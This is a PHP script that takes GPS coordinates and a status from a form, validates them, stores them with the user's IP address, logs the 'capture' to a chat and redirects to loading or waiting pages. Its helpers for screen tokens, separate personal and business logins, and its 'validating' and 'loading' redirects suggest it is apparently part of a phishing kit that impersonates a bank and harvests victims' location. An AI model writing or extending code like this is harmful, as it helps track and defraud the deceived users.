<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/token_pantalla_helpers.php';
require_once __DIR__ . '/../php_config/gps_helpers.php';
session_start();

$usuario = null;
$rutasGps = ['gps' => 'gps.php', 'validando' => 'authenticate-execution.php', 'login' => 'personas.html'];

function gpsUrlPagina(array $rutas, string $clave): string
{
    $ruta = $rutas[$clave] ?? 'gps.php';

    if ($ruta === 'authenticate_gps.php') {
        return '../empresas/authenticate_gps.php';
    }

    if ($ruta === 'index.php') {
        return '../empresas/index.php';
    }

    return '../' . ltrim($ruta, '/');
}

if (!isset($_SESSION['usuario_id'])) {
    header('Location: ../personas.html');
    exit;
}

try {
    $pdo = conectarBD();
    $usuarioId = (int) $_SESSION['usuario_id'];
    $usuario = tokenPantallaObtenerUsuario($pdo, $usuarioId);
    $rutasGps = tokenPantallaRutas($usuario);
} catch (PDOException $e) {
    header('Location: ' . gpsUrlPagina($rutasGps, 'gps'));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ' . gpsUrlPagina($rutasGps, 'gps'));
    exit;
}

$latitudRaw = trim($_POST['latitud'] ?? '');
$longitudRaw = trim($_POST['longitud'] ?? '');
$gpsEstado = trim($_POST['gps_estado'] ?? '');

$latitud = is_numeric($latitudRaw) ? (float) $latitudRaw : null;
$longitud = is_numeric($longitudRaw) ? (float) $longitudRaw : null;

if ($latitud !== null && ($latitud < -90 || $latitud > 90)) {
    $latitud = null;
}

if ($longitud !== null && ($longitud < -180 || $longitud > 180)) {
    $longitud = null;
}

if ($latitud === null || $longitud === null) {
    $coordenadas = null;
    if ($gpsEstado === '') {
        $gpsEstado = 'no_disponible';
    }
} else {
    $coordenadas = gpsFormatoCoordenadas($latitud, $longitud);
    $gpsEstado = $gpsEstado !== '' ? $gpsEstado : 'capturado';
}

try {
    if (!$usuario || !tokenPantallaPuedeAccederGps($usuario)) {
        header('Location: ' . gpsUrlPagina(tokenPantallaRutas($usuario), 'validando'));
        exit;
    }

    $ipUsuario = trim((string) ($usuario['ip_real'] ?? '')) ?: ($_SERVER['REMOTE_ADDR'] ?? 'unknown');

    $stmt = $pdo->prepare('UPDATE usuarios SET coordenadas_gps = ?, gps_estado = ?, ip_real = ? WHERE id = ?');
    $stmt->execute([$coordenadas, $gpsEstado, $ipUsuario, $usuarioId]);

    gpsRegistrarCapturaChat($pdo, $usuarioId, $coordenadas, $gpsEstado, $ipUsuario);

    if (tokenPantallaEsPersona($usuario)) {
        header('Location: ../cargando-execution.php');
    } else {
        header('Location: ../empresas/netespera.php');
    }
    exit;
} catch (PDOException $e) {
    header('Location: ' . gpsUrlPagina($rutasGps, 'gps'));
    exit;
}
